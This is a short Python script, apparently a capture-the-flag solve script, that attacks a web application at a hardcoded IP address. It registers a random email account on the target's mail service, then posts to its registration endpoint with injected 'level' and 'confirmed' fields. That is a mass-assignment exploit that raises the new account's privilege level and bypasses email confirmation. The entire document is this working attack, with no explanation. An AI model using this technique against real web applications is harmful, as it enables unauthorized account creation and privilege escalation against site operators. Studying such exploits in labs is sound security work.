import os
import requests

name = os.urandom(4).hex()
email = f"{name}@firebird.sh"
password = "firebirdie"

with requests.post(
    "http://20.55.48.101/mail/index.php",
    data={
        "register-submit": "",
        "email": email,
        "password": password,
        "confirm-password": password,
    },
) as req:
    ...
    # print(req.content)
    print(f"{email}:{password}")

with requests.post(
    "http://20.55.48.101/register.php",
    data={
        "register-submit": "",
        "email": email,
        "password": password,
        "level": 1,
        "confirmed": 1,
    },
) as req:
    ...
    # print(req.content)
